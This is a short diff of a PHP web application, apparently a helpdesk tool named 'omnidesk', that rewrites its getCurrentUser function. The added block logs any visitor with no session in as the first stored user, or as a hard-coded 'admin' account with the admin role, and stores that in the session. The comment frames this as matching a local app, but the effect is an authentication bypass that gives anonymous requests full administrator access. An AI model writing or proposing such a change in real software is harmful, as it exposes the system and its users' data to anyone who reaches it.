@@ -90,16 +90,29 @@ function sanitizeUser($user) {
 
 // Retrieve currently authenticated user
 function getCurrentUser($usersFile) {
+    $users = getUsers($usersFile);
     if (isset($_SESSION['omnidesk_user']) && is_array($_SESSION['omnidesk_user'])) {
         $userId = $_SESSION['omnidesk_user']['id'] ?? '';
-        $users = getUsers($usersFile);
         foreach ($users as $u) {
             if ($u['id'] === $userId && $u['status'] === 'active') {
                 return sanitizeUser($u);
             }
         }
     }
-    return null;
+    // Auto-authenticate default administrator if no session exists (matching the local app)
+    $defaultAdmin = $users[0] ?? [
+        'id'            => 'USR-ADMIN-01',
+        'name'          => 'System Administrator',
+        'username'      => 'admin',
+        'email'         => 'admin@nunno.cloud',
+        'role'          => 'admin',
+        'designation'   => 'Admin',
+        'phone'         => '',
+        'status'        => 'active'
+    ];
+    $safeUser = sanitizeUser($defaultAdmin);
+    $_SESSION['omnidesk_user'] = $safeUser;
+    return $safeUser;
 }
 
 // Process request
